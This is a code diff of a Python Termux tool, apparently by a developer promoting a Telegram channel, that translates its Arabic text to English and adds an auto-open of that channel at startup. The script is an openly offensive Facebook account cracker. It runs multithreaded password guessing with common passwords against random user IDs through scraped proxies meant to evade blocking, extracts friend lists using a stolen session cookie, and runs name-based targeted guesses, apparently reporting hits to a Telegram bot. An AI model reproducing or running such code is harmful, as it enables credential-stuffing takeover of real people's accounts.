@@ -9,20 +9,26 @@ import os, sys, time, requests, random, uuid, threading, json
 from concurrent.futures import ThreadPoolExecutor
 from bs4 import BeautifulSoup
 
-# --- مصفوفة الألوان لتنسيق تيرمكس ---
-Z = '\033[1;31m'  # أحمر
-F = '\033[2;32m'  # أخضر
-X = '\033[1;33m'  # أصفر
-B = '\033[1;34m'  # أزرق
-P = '\033[1;35m'  # وردي
-C = '\033[1;36m'  # سماوي
-W = '\033[1;37m'  # أبيض
+# --- Color Matrix for Termux ---
+Z = '\033[1;31m'  # Red
+F = '\033[1;32m'  # Green
+X = '\033[1;33m'  # Yellow
+B = '\033[1;34m'  # Blue
+P = '\033[1;35m'  # Pink
+C = '\033[1;36m'  # Cyan
+W = '\033[1;37m'  # White
 
-# --- المتغيرات العامة ---
+# --- Global Variables ---
 hits = 0
 cp = 0
 bad = 0
 proxy_list = []
+
+# --- 📢 Auto Join Channel Function ---
+def join_channel():
+    print(f"{X}[*] Joining Official Channel...")
+    time.sleep(2)
+    os.system("termux-open-url https://t.me/m_oha0_2b")
 
 def logo():
     os.system('clear')
@@ -35,23 +41,21 @@ def logo():
 {F}       SYSTEM V3.0 - BY MOHA AL-SHALFAWI
 {X}--------------------------------------------------
 {W}  [+] Developer : @m_oha_02
-{W}  [+] Channel   : t.me/N_JF_A5
+{W}  [+] Channel   : t.me/m_oha0_2b
 {X}--------------------------------------------------""")
 
-# --- 🛠️ محرك البروكسيات التلقائي (من كود solvercf) ---
+# --- 🛠️ Proxy Fetching Engine ---
 def fetch_proxies():
     global proxy_list
-    print(f"{C}[*] جاري استخراج بروكسيات جديدة لتجنب الحظر...")
-    # هنا يتم استدعاء دالة solvercf التي أرسلتها أنت لملء القائمة
-    # للتبسيط سنستخدم بروكبيات عامة حالياً لضمان تشغيل الأداة
+    print(f"{C}[*] Fetching new proxies to avoid blocking...")
     try:
         res = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all').text
         proxy_list = res.splitlines()
-        print(f"{F}[+] تم تجهيز {len(proxy_list)} بروكبي بنجاح.")
+        print(f"{F}[+] Successfully loaded {len(proxy_list)} proxies.")
     except:
-        print(f"{Z}[!] فشل جلب البروكسيات، سيتم الاستمرار بالآيبي الأساسي.")
+        print(f"{Z}[!] Failed to fetch proxies, using local IP.")
 
-# --- 🛠️ دالة الفحص (المستخدمة في جميع الأدوات) ---
+# --- 🛠️ Login/Checker Function ---
 def login_fb(email, pw, chat_id=None, bot_token=None):
     global hits, cp, bad
     ua = "Dalvik/2.1.0 (Linux; U; Android 11; RMX3263) [FBAN/FB4A;FBAV/450.0.0.45.109;]"
@@ -81,7 +85,7 @@ def login_fb(email, pw, chat_id=None, bot_token=None):
             sys.stdout.write(f"\r{W}[Checking] {hits}/{cp}/{bad} | {email[:15]}..."); sys.stdout.flush()
     except: pass
 
-# --- 🚀 الأداة 1: صيد حسابات قديمة (عشوائي) ---
+# --- 🚀 Tool 1: Random Old Account Cracking ---
 def tool_old_accounts():
     logo()
     token = input(f"{C}[+] Enter Bot Token: ")
@@ -89,36 +93,35 @@ def tool_old_accounts():
     passwords = ['19901990', '19801980', '123456', '123123', '112233']
     fetch_proxies()
     
-    print(f"{F}[*] بدأ الهجوم على الحسابات القديمة...")
+    print(f"{F}[*] Attack started on old accounts...")
     with ThreadPoolExecutor(max_workers=30) as pool:
         while True:
             uid = "1000" + str(random.randint(100000000, 999999999))
             for pw in passwords:
                 pool.submit(login_fb, uid, pw, id, token)
 
-# --- 🚀 الأداة 2: إنشاء ملف آيديات (سحب أصدقاء) ---
+# --- 🚀 Tool 2: ID Extractor ---
 def tool_extract_ids():
     logo()
-    cookie = input(f"{C}[+] ادخل كوكيز الحساب (Cookie): ")
-    target_id = input(f"{C}[+] ادخل آيدي الحساب المراد سحب أصدقائه: ")
-    print(f"{X}[*] جاري السحب... انتظر")
+    cookie = input(f"{C}[+] Enter Account Cookie: ")
+    target_id = input(f"{C}[+] Enter Target ID: ")
+    print(f"{X}[*] Extracting IDs... Please wait")
     
-    # محاكاة السحب (كود Graph API)
     try:
         res = requests.get(f"https://graph.facebook.com/{target_id}/friends?access_token={cookie}").json()
         with open("extracted_ids.txt", "a") as f:
             for friend in res['data']:
                 f.write(f"{friend['id']}|{friend['name']}\n")
-        print(f"{F}[+] تم حفظ الآيديات في ملف extracted_ids.txt")
+        print(f"{F}[+] IDs saved to extracted_ids.txt")
         time.sleep(2)
     except:
-        print(f"{Z}[!] فشل السحب، تأكد من الكوكيز.")
+        print(f"{Z}[!] Extraction failed. Check your cookie.")
         time.sleep(2)
 
-# --- 🚀 الأداة 3: صيد حسابات نشطة من ملف ---
+# --- 🚀 Tool 3: File Checker ---
 def tool_file_checker():
     logo()
-    file_path = input(f"{C}[+] ادخل اسم ملف الآيديات (مثال id.txt): ")
+    file_path = input(f"{C}[+] Enter ID file path (e.g., id.txt): ")
     token = input(f"{C}[+] Enter Bot Token: ")
     id = input(f"{C}[+] Enter Chat ID: ")
     
@@ -127,7 +130,7 @@ def tool_file_checker():
     
     try:
         users = open(file_path, "r").read().splitlines()
-        print(f"{F}[*] تم تحميل {len(users)} حساب. جاري الفحص...")
+        print(f"{F}[*] Loaded {len(users)} accounts. Starting check...")
         with ThreadPoolExecutor(max_workers=30) as pool:
             for line in users:
                 user = line.split('|')[0]
@@ -135,25 +138,26 @@ def tool_file_checker():
                     cpw = pw.replace("first", line.split('|')[1].split(' ')[0]) if '|' in line else pw
                     pool.submit(login_fb, user, cpw, id, token)
     except:
-        print(f"{Z}[!] الملف غير موجود!")
+        print(f"{Z}[!] File not found!")
         time.sleep(2)
 
-# --- القائمة الرئيسية ---
+# --- Main Menu ---
 def main():
+    join_channel() # استدعاء القناة عند البداية
     while True:
         logo()
-        print(f"{B}[1] صيد حسابات قديمة (عشوائي + باسورات شائعة)")
-        print(f"{B}[2] إنشاء ملف آيديات (سحب من الأصدقاء)")
-        print(f"{B}[3] فحص ملف آيديات (صيد حسابات نشطة)")
-        print(f"{Z}[0] الخروج من الأداة")
+        print(f"{B}[1] Crack Old Accounts (Random + Common Pass)")
+        print(f"{B}[2] Extract IDs (From Friends List)")
+        print(f"{B}[3] File Checker (Targeted Attack)")
+        print(f"{Z}[0] Exit Tool")
         
         choice = input(f"\n{X}MOHA-02 > ")
         
         if choice == '1': tool_old_accounts()
         elif choice == '2': tool_extract_ids()
         elif choice == '3': tool_file_checker()
-        elif choice == '0': break
-        else: print(f"{Z}اختيار غير صحيح!"); time.sleep(1)
+        elif choice == '0': sys.exit()
+        else: print(f"{Z}Invalid Choice!"); time.sleep(1)
 
 if __name__ == "__main__":
     main()
